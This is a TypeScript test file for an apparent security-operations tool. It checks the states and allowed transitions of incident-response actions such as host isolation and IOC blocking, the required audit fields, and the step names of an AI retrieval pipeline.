// ═══════════════════════════════════════════════════════════════════════════════

describe("Response Action State Machine", () => {
  const VALID_STATES = ["proposed", "approved", "rejected", "executed", "deferred"];
  const VALID_CATEGORIES = [
    "isolate_host", "disable_account", "block_ioc", "escalate_ir",
    "suppress_alert", "tune_rule", "add_watchlist", "collect_evidence",
    "notify_stakeholder", "custom",
  ];

  const VALID_TRANSITIONS: Record<string, string[]> = {
    proposed: ["approved", "rejected", "deferred"],
    approved: ["executed", "rejected"],
    rejected: [],
    executed: [],
    deferred: ["proposed"],
  };

  it("all valid states are defined", () => {
    expect(VALID_STATES).toHaveLength(5);
  });

  it("all valid action categories are defined", () => {
    expect(VALID_CATEGORIES).toHaveLength(10);
  });

  it("proposed can transition to approved, rejected, or deferred", () => {
    expect(VALID_TRANSITIONS.proposed).toContain("approved");
    expect(VALID_TRANSITIONS.proposed).toContain("rejected");
    expect(VALID_TRANSITIONS.proposed).toContain("deferred");
  });

  it("approved can transition to executed or rejected", () => {
    expect(VALID_TRANSITIONS.approved).toContain("executed");
    expect(VALID_TRANSITIONS.approved).toContain("rejected");
  });

  it("rejected is a terminal state", () => {
    expect(VALID_TRANSITIONS.rejected).toHaveLength(0);
  });

  it("executed is a terminal state", () => {
    expect(VALID_TRANSITIONS.executed).toHaveLength(0);
  });

  it("deferred can be re-proposed", () => {
    expect(VALID_TRANSITIONS.deferred).toContain("proposed");
  });

  it("no state can transition to proposed except deferred", () => {
    for (const [state, transitions] of Object.entries(VALID_TRANSITIONS)) {
      if (state !== "deferred") {
        expect(transitions).not.toContain("proposed");
      }
    }
  });

  it("every state transition requires who, when, reason, from_state, to_state", () => {
    const auditEntry = {
      actionId: 1,
      fromState: "proposed",
      toState: "approved",
      changedBy: "analyst-1",
      changedAt: new Date().toISOString(),
      reason: "Confirmed threat — isolate immediately",
    };
    expect(auditEntry.actionId).toBeTruthy();
    expect(auditEntry.fromState).toBeTruthy();
    expect(auditEntry.toState).toBeTruthy();
    expect(auditEntry.changedBy).toBeTruthy();
    expect(auditEntry.changedAt).toBeTruthy();
    expect(auditEntry.reason).toBeTruthy();
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// PIPELINE CONTEXT INTEGRATION
// ═══════════════════════════════════════════════════════════════════════════════

describe("Pipeline Context Integration (Unified AI Path)", () => {
  it("pipeline context sources are defined", () => {
    const contextSources = [
      "active_living_cases",
      "pending_response_actions",
      "recent_triage_results",
      "pipeline_run_stats",
    ];
    for (const source of contextSources) {
      expect(typeof source).toBe("string");
    }
  });

  it("pipeline retriever is a valid agent step type", () => {
    const validAgentSteps = [
      "intent_analyzer", "graph_retriever", "indexer_retriever",
      "stats_retriever", "pipeline_retriever", "synthesizer",
    ];
    expect(validAgentSteps).toContain("pipeline_retriever");
  });
});
